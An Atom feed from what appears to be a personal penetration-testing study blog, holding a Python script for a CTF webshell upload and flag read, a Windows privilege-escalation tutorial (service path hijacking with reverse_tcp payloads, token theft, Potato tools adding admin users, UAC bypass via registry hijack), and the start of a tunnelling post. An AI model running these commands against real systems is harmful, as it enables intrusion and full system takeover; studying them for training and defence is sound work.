<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ruan❥(^_-) Blog</title>
  
  
  <link href="https://ruan0423.github.io/atom.xml" rel="self"/>
  
  <link href="https://ruan0423.github.io/"/>
  <updated>2023-11-06T14:07:38.913Z</updated>
  <id>https://ruan0423.github.io/</id>
  
  <author>
    <name>Traveler</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python脚本之requests库上传文件</title>
    <link href="https://ruan0423.github.io/2023/11/06/python%E8%84%9A%E6%9C%AC%E4%B9%8Brequests%E5%BA%93%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"/>
    <id>https://ruan0423.github.io/2023/11/06/python%E8%84%9A%E6%9C%AC%E4%B9%8Brequests%E5%BA%93%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</id>
    <published>2023-11-06T12:56:15.000Z</published>
    <updated>2023-11-06T14:07:38.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在学习的时候，发现有一个AWD的文件上传执行漏洞，突然想着批量对不同靶机进行操作并get_flag。思路简单，但是没构造 过文件上传的requests 的post请求的payload。便记录一下。</p><h1 id="二、构造知识"><a href="#二、构造知识" class="headerlink" title="二、构造知识"></a>二、构造知识</h1><p>在上传文件的时候，数据表的post 请求体里面通常是下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarycXFjbullGiRoq8pc</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();&gt;</span><br><span class="line">------WebKitFormBoundarycXFjbullGiRoq8pc</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXFjbullGiRoq8pc--</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中“——WebKitFormBoundarycXFjbullGiRoq8pc”是参数分割符，不用管。</p><p>那么这就可以看成两个参数。</p><p>在构建post数据请求体的时候。这两个参数的格式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">name:(&lt;filename&gt;,&lt;file_content&gt;,&lt;content-type&gt;)</span><br><span class="line">#name 是字段里面的name，比如upload_file</span><br><span class="line">#&lt;filename&gt; 上传的文件名</span><br><span class="line">#如果参数没有就填none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所以上述的构造 可以为：</span><br><span class="line"></span><br><span class="line">file_payload = &#123;</span><br><span class="line">&quot;upload_file&quot;:(&quot;2.php&quot;,open(&quot;2.php&quot;,&#x27;rb&#x27;),&quot;image/jpeg&quot;),</span><br><span class="line">&quot;submit&quot;:(none,none,none)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、实战脚本"><a href="#三、实战脚本" class="headerlink" title="三、实战脚本"></a>三、实战脚本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Host&#x27;: &#x27;1.14.110.159:10003&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://1.14.110.159:10003/Pass-01/index.php&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def upload_file(url):</span><br><span class="line"></span><br><span class="line">    file_payload = &#123;</span><br><span class="line">        &quot;upload_file&quot;: (&quot;t.php&quot;, open(&quot;2.txt&quot;, &#x27;r&#x27;), &quot;image/jpeg&quot;),</span><br><span class="line">        &quot;submit&quot;: (None, &quot;None&quot;, None)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    re = requests.post(url,headers=headers,files=file_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_flag(url):</span><br><span class="line">    parm = &#123;</span><br><span class="line">        &#x27;cmd&#x27;:&#x27;system(&quot;cat ../flag&quot;);&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,headers=headers,data=parm).text</span><br><span class="line">    return re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    # url = &#x27;http://1.14.110.159:10003/Pass-01/index.php&#x27;</span><br><span class="line">    # upload_file(url)</span><br><span class="line">    </span><br><span class="line">    #getflag</span><br><span class="line">    url = &quot;http://1.14.110.159:10003/upload/t.php&quot;</span><br><span class="line">    a=get_flag(url)</span><br><span class="line">    print(a)</span><br><span class="line">#如果批量上传或者getflag,那么使用for即可。当然提前处理url的拼接。</span><br><span class="line">#for url in urls:</span><br><span class="line">#upload_file(url)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h1&gt;&lt;p&gt;在学习的时候，发现有一个AWD的文件上传执行漏洞，突然想着批量对不同靶机进行操作并get_flag。思路简单，但是没构造 过</summary>
      
    
    
    
    <category term="python" scheme="https://ruan0423.github.io/categories/python/"/>
    
    
    <category term="脚本" scheme="https://ruan0423.github.io/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透-Windows常用提权方法</title>
    <link href="https://ruan0423.github.io/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/"/>
    <id>https://ruan0423.github.io/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/</id>
    <published>2023-11-04T06:43:30.000Z</published>
    <updated>2023-11-06T09:40:13.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>将介绍常见的提权方法。从为什么该方法能够提权（原理）到使用方法。</p><h1 id="二、系统内核漏洞提权"><a href="#二、系统内核漏洞提权" class="headerlink" title="二、系统内核漏洞提权"></a>二、系统内核漏洞提权</h1><h2 id="1-为什么能提权？"><a href="#1-为什么能提权？" class="headerlink" title="1.为什么能提权？"></a>1.为什么能提权？</h2><p>内核漏洞通常是指内核溢出漏洞，什么溢出呢？缓冲区溢出。</p><p>那什么是缓冲区溢出呢？当应用程序或者是内核的驱动程序在接受用户输入的数据的时候，它会把这些数据存储在缓冲区，但是当数据过多溢出的时候，这样溢出的数据可能就会覆盖栈或者堆中的数据结构，包括函数的返回地址和权限的控制信息。攻击者就会利用操作输入的数据来覆盖代替内核的关键数据结构。将恶意代码植入到内核内存中。从来达到提权。</p><p>当存在这种漏洞的时候，要及时打上补丁。当然这里就是利用没有打上补丁的系统去提权。主要就是信息收集。</p><h2 id="2-手动寻找可利用的漏洞"><a href="#2-手动寻找可利用的漏洞" class="headerlink" title="2.手动寻找可利用的漏洞"></a>2.手动寻找可利用的漏洞</h2><p>使用命令去查看系统打了哪些补丁。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">或者</span><br><span class="line">wmic qfe get caption , description , hotfixid ,installedon</span><br></pre></td></tr></table></figure><p>再去<a href="https://i.hacking8.com/tiquan/%E6%88%96%E8%80%85http://blog.neargle.com/win-powerup-exp-index/%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%E6%9C%AA%E5%AE%89%E8%A3%85%E8%A1%A5%E4%B8%81%E6%88%96%E6%90%9C%E7%B4%A2%E5%8F%AF%E7%94%A8exp">https://i.hacking8.com/tiquan/或者http://blog.neargle.com/win-powerup-exp-index/进行查询未安装补丁或搜索可用exp</a></p><h2 id="3-自动寻找"><a href="#3-自动寻找" class="headerlink" title="3.自动寻找"></a>3.自动寻找</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><br><span class="line">使用Windows-Exploit-Suggester</span><br><span class="line">1 ./windows-exploit-suggester.py --update</span><br><span class="line">2 使用systeminfo获取系统信息，将其保存，如1.txt</span><br><span class="line">3 ./windows-exploit-suggester.py --database 2023-11-04-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure><h1 id="三、系统服务提权"><a href="#三、系统服务提权" class="headerlink" title="三、系统服务提权"></a>三、系统服务提权</h1><h2 id="1-为什么系统服务能提权？"><a href="#1-为什么系统服务能提权？" class="headerlink" title="1.为什么系统服务能提权？"></a>1.为什么系统服务能提权？</h2><p>windows系统服务在操作系统启动时运行，并在后台调用可执行文件。但是大多数服务都是以system的权限启动的，如果让这个服务启动时区启动其他的程序，该程序就会随着服务的启动获得系统权限。因此，如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p><p>现在有哪些不安全的系统服务能提权呢？</p><h2 id="2-不安全的服务权限"><a href="#2-不安全的服务权限" class="headerlink" title="2.不安全的服务权限"></a>2.不安全的服务权限</h2><p>什么是服务权限，就是对服务操作的权限。ACL定义了安全对象的访问控制策略，就是规定哪些用户有些什么样的权限，常见的如下表。其中呢对服务的权限控制呢可能就疏忽了，给用户配置了 SERVICE_CHANGE_CONFIG （更改服务配置权限）或者 SERVICE_ALL_ACCESS(完全控制权限)。也即是说，当这个用户有这两个权限之一，他就可以修改这个服务的启动时候的二进制文件路径。让他去执行恶意文件。从而达到提权。</p><table><thead><tr><th align="left">权限</th><th>说明</th></tr></thead><tbody><tr><td align="left">SERVICE_START</td><td>服务启动</td></tr><tr><td align="left">SERVICE_STOP</td><td>服务暂停</td></tr><tr><td align="left">SERVICE_PAUSE_CONTINUE</td><td>服务启动或者暂停</td></tr><tr><td align="left">SERVICE_QUERY_CONFIG</td><td>查询服务配置的权限</td></tr><tr><td align="left">SERVICE_CHANGE_CONFIG</td><td>更改服务配置的权限</td></tr><tr><td align="left">SERVICE_ALL_ACCESS</td><td>完全控制权限</td></tr><tr><td align="left"></td><td></td></tr></tbody></table><p>那我们只要找“Authenticated Users”组和”INTERACTIVE“组的对系统服务的权限是否有SERVICE_CHANGE_CONFIG或者SERVICE_ALL_ACCESS的权限。</p><p>为什么找这两个组呢？因为这两个组是计算机本地users组的成员。</p><p>怎么查询呢？可以使用工具<strong>accesschk</strong></p><p>使用以下命令进行查询:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">或者</span><br><span class="line">accesschk.exe /accepteula -uwcqv &quot;INTERCTIVE&quot; *</span><br></pre></td></tr></table></figure><p>这样就能查询该组是否有更改服务配置的权限。</p><p>例如发现 InsproSvc 服务具有SERVICE_CHANGE_CONFIG的权限。那么就可以将该服务启动时执行的二进制文件替换成预先上传的攻击载荷。当服务重启攻击载荷（reverse_tcp）就会继承系统权限。如下命令进行替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc config Insprosvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;</span><br><span class="line"># 指定insprosvc服务的二进制文件路径，=后要有空格</span><br></pre></td></tr></table></figure><p>重启服务之后就会生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop insprosvc</span><br><span class="line">sc start insprosvc</span><br></pre></td></tr></table></figure><h2 id="3-服务注册表权限"><a href="#3-服务注册表权限" class="headerlink" title="3.服务注册表权限"></a>3.服务注册表权限</h2><p>和2一样，如果低用户对某些服务的注册表拥有写入权限，那么就可以修改服务的启动路径为攻击载荷路径。</p><p>Accesschk.exe 查看用户是否有这些权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services</span><br></pre></td></tr></table></figure><p>假设发现对RegSvc服务具有完全控制的权限。那么就修改路劲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\RegSvc /v ImagePath /t REG_EXPAND_SAZ /d “cmd.exe /k C:\users\public\revers_tcp.exe&quot; /f</span><br></pre></td></tr></table></figure><p>使用命令查看是否拥有重启权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; RegSvc</span><br></pre></td></tr></table></figure><p>有的话重启就可提权</p><h2 id="4-服务路径权限可控"><a href="#4-服务路径权限可控" class="headerlink" title="4.服务路径权限可控"></a>4.服务路径权限可控</h2><p>某个服务的二进制文件权限可以写入，那么就可以将载荷攻击文件写在那。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get displayname,startmode,pathname|findstr /i “Auto” | findstr /i /v “C:\Windows\”</span><br><span class="line">探测符合条件的服务</span><br></pre></td></tr></table></figure><p>如果发现某个服务的路径可写。那么就将那个服务的可运行文件替换成同名的攻击载荷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/reverse_tcp &quot;c:\program\xx\xx.exe&quot;</span><br></pre></td></tr></table></figure><p>再重启服务即可提权。</p><h2 id="5-powerup"><a href="#5-powerup" class="headerlink" title="5.powerup"></a>5.powerup</h2><p>当然上述的所有关于服务的提权，powerup中都有涉及。<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p><p>详细使用参考<a href="https://blog.csdn.net/l1028386804/article/details/86089574?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169917767416800225535038%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169917767416800225535038&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-86089574-null-null.142%5Ev96%5Epc_search_result_base5&utm_term=PowerUP&spm=1018.2226.3001.4187">https://blog.csdn.net/l1028386804/article/details/86089574?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169917767416800225535038%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169917767416800225535038&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-86089574-null-null.142^v96^pc_search_result_base5&amp;utm_term=PowerUP&amp;spm=1018.2226.3001.4187</a></p><p>基本使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.导入模块 Import-Module .\PowerUp.ps1</span><br><span class="line">2.一键查询服务Invoke-AllChecks</span><br></pre></td></tr></table></figure><h1 id="四、令牌窃取"><a href="#四、令牌窃取" class="headerlink" title="四、令牌窃取"></a>四、令牌窃取</h1><h2 id="1-什么是令牌窃取？为什么能提权？"><a href="#1-什么是令牌窃取？为什么能提权？" class="headerlink" title="1.什么是令牌窃取？为什么能提权？"></a>1.什么是令牌窃取？为什么能提权？</h2><p>首先得知道什么是令牌？这里的令牌窃取通常是指进程的访问令牌的窃取？那什么是访问令牌？访问令牌是描述进程安全上下文的对象，包含了与该进程相关的用户账户标识和特权等信息。</p><p>然后就可以通过操作一个高权限进程的访问令牌来 当做一个进程的令牌。就是说偷其他进程的令牌来用。然后就可以拥有那个令牌自身拥有的权限。</p><p>能偷其他进程的访问令牌的<strong>条件</strong>：该用户必须有SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilege权限。而这两个权限的用户通常是系统管理员账户，web服务账户，和IIs MsSQL账户等。</p><h2 id="2-直接令牌窃取（直接偷）"><a href="#2-直接令牌窃取（直接偷）" class="headerlink" title="2.直接令牌窃取（直接偷）"></a>2.直接令牌窃取（直接偷）</h2><p><strong>2.1 使用incognnito.exe</strong>。上传到主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u #列举当前主机上的所有访问令牌</span><br><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami</span><br><span class="line">#-c 偷令牌，whoami 偷完后执行的命令</span><br><span class="line">incognito.exe execute -c &quot;travel-me\Bob&quot; cmd</span><br><span class="line">偷域下Bob的令牌，然后执行它的。也就是切换到Bob的用户。</span><br></pre></td></tr></table></figure><p><strong>2.2 使用MetaSploit 偷</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">steal_token &lt;PID&gt; #偷上面所列进程的ID令牌</span><br></pre></td></tr></table></figure><p>有时候system 权限也有更改不了的东西，比如Windows系统文件，那么就可以偷TrustedInstaller权限。</p><p>sc start TrustedInstaller  启动服务</p><p>steal_token <Pid></p><h2 id="3-Potato土豆提权"><a href="#3-Potato土豆提权" class="headerlink" title="3.Potato土豆提权"></a>3.Potato土豆提权</h2><p>potato家族有很多小偷，专门偷人家的令牌。比如：Rotten Potato 烂土豆，Juicy potato 等。</p><p>甜土豆集成了大多数土豆<a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p><p>使用 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sweetpotato.exe -a &lt;命令&gt;</span><br><span class="line"></span><br><span class="line">#比如 sweetpotato.exe -a whoami </span><br><span class="line">sweetpotato.exe -a &quot;net user test Admin&amp;1 /add&quot;</span><br><span class="line">sweetpotato.exe -a &quot;net user localgroup Administrator test /add&quot;</span><br><span class="line">添加管理员用户。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="五、绕过UAC"><a href="#五、绕过UAC" class="headerlink" title="五、绕过UAC"></a>五、绕过UAC</h1><h2 id="1-什么是UAC？绕过他为什么就能提权？"><a href="#1-什么是UAC？绕过他为什么就能提权？" class="headerlink" title="1.什么是UAC？绕过他为什么就能提权？"></a>1.什么是UAC？绕过他为什么就能提权？</h2><p>UAC （user Account Control）用户账户控制，用来管理操作系统不让他乱安程序。在安装软件的时候一般都会弹出来一个是否允许安装的提示，就是那个东西。</p><p>绕过它之后咱就可以安装恶意软件了呗。然后就可以提权。但严格意义上来说也不是提权，只是绕过了这种保护机制。</p><h2 id="2-通过UAC白名单绕过"><a href="#2-通过UAC白名单绕过" class="headerlink" title="2.通过UAC白名单绕过"></a>2.通过UAC白名单绕过</h2><p>什么是UAC白名单？操作系统自己有一些进程在运行的时候不需要通过验证就直接可以运行，这些程序在UAC白名单中，比如：slui.exe.taskmgr.exe等。</p><p>当这些程序运行的时候可以通过DLL劫持，DLL注入或者注册表劫持等 绕过DLL去执行我们的恶意程序。</p><p>这里举例注册表劫持：</p><h5 id="2-1-首先使用工具找出白名单的程序。"><a href="#2-1-首先使用工具找出白名单的程序。" class="headerlink" title="2.1 首先使用工具找出白名单的程序。"></a>2.1 首先使用工具找出白名单的程序。</h5><p>在UAC白名单中的程序都有一个特点，就是Mainfest数据中的autoElevate属性的值为True。</p><p>strings.exe 可以检测程序是否有autoElevate 属性，从而找出白名单的程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.exe /accepteula -s C:\windows\system32\*.exe | findstr /i &quot;aotoElevate&quot;</span><br></pre></td></tr></table></figure><p>假如ComputerDefaults.exe 进程：</p><p>打开这个exe,没有验证直接进入默认应用界面。</p><p>通过进程监控 分析该进程会发现，它会先去访问HKCU\Software\Classes\ms-settings\shell\open\command，发现没东西后再去访问 HKCR\ms-settings\Shell\Open\Command\DelegateExecute.</p><p>然后我们就可以劫持HKCU\Software\Classes\ms-settings\shell\open\command 中的默认值和 DelegateExecute</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /d &quot;C:\windows\system32\cmd.exe&quot;  #可以是攻击载荷的路径。</span><br><span class="line"></span><br><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>当这个应用重启的时候就会反弹或者打开cmd，然后getsystem</p><h2 id="3-DLL劫持"><a href="#3-DLL劫持" class="headerlink" title="3.DLL劫持"></a>3.DLL劫持</h2><p>什么是DLL劫持，程序通常并不是一个完整的可执行文件，被分割成一些DLL文件。当应用程序加载DLL时，如果没有指定DLL的绝对路径，那么程序就会以特定的顺序去遍历搜索加载的DLL，如果将同名的恶意的DLL文件放在真正的DLL之前，那么就会被劫持。这就是劫持。</p><p>但是这前提是这个遍历目录可写。这个目录通常又不可写。所以这个技术通常和模拟可信任技术来配合使用。</p><p>所以提出下面这个 模拟可信任目录</p><h2 id="4-模拟可信任目录"><a href="#4-模拟可信任目录" class="headerlink" title="4.模拟可信任目录"></a>4.模拟可信任目录</h2><p>之前说了UAC白名单中的程序的manifest 数据中的autoElevate为true，当执行的时候，不但要检查这个条件，还要检查这个程序是否在可信任目录C：\windows\system32中。两者缺一不可。但是当系统在检查可信任目录时，会自动去除路径中的空格。比如 </p><p>”C:\Windows   \system32” 会被解析成 “C:\windows\system32”</p><p>那么我们就可以创建一个”C:\Windows   \system32”目录，把白名单中的程序复制进这个含空格的目录中。再把恶意DLL文件放到这个模拟的可信任目录中。然后运行这个模拟目录中的可执行程序。就会达到绕过UAC DLL劫持提权的效果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md &quot;\\?\C:\Windows &quot;</span><br><span class="line">md &quot;\\?\C:\Windows \System32&quot;</span><br><span class="line">copy C:\Windows\System32\winSTA.exe  &quot;C:\Windows \System32\winSAT.exe&quot;</span><br></pre></td></tr></table></figure><p>但是制作DLL的时候，要注意恶意DLL的导出函数要与被劫持的DLL一样。</p><p>专业名词解释：DelegateExecute 是 Windows 操作系统中的一个 COM (Component Object Model) 接口，它通常与应用程序扩展和外部处理程序相关。DelegateExecute 接口允许一个应用程序或组件将某些任务委托给其他程序或处理程序来执行，通常是为了增强功能或实现某种定制化的行为。</p><p>Manifest 数据指的是一个应用程序清单（Application Manifest），它是一个用于描述应用程序特性、依赖关系、权限要求以及其他元数据的 XML 文件。应用程序清单通常附加到应用程序的可执行文件（如 .exe 文件）或动态链接库（DLL）中，以便操作系统和其他程序能够正确地识别和与应用程序互动。</p><h2 id="5-使用MSF下的Bypass模块绕过UAC"><a href="#5-使用MSF下的Bypass模块绕过UAC" class="headerlink" title="5.使用MSF下的Bypass模块绕过UAC"></a>5.使用MSF下的Bypass模块绕过UAC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit/windows/local/bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 1</span><br><span class="line">set lhost 0.0.0.0          </span><br><span class="line">set lport 24444                #本地监听的端口，随便设置一个未被占用的端口即可</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h1&gt;&lt;p&gt;将介绍常见的提权方法。从为什么该方法能够提权（原理）到使用方法。&lt;/p&gt;
&lt;h1 id=&quot;二、系统内核漏洞提权&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://ruan0423.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透-隧道搭建</title>
    <link href="https://ruan0423.github.io/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/"/>
    <id>https://ruan0423.github.io/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/</id>
    <published>2023-11-02T10:49:44.000Z</published>
    <updated>2023-11-02T14:17:29.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>为什么要进行代理搭建？因为目标主机会把一些可利用的端口给禁了，或者说内网 的防火墙不允许这些端口出现，那么这时候就需要搭建一个隧道，什么是隧道，对于小白来说可能有点抽象，其实就是主机与攻击机之间的通讯端口，然后还会设计到端口转发或者是端口映射的问题。</p><p>端口转发一般发生在一个主机里面，将800端口的流量转到900，而端口映射一般是两个主机，比如访问A主机的800端口就相当于访问B主机的900端口。但对其并没有多大的区分。</p><p>这里介绍lcx 和frp的使用。其他不讲。</p><h1 id="二、需要搭建代理的场景"><a href="#二、需要搭建代理的场景" class="headerlink" title="二、需要搭建代理的场景"></a>二、需要搭建代理的场景</h1><p>根据场景的复杂度通常需要设置一级代代理、二级代理….如果目标无公网ip就得使用VPS</p><h2 id="1-场景一"><a href="#1-场景一" class="headerlink" title="1.场景一"></a>1.场景一</h2><p>最简单的场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 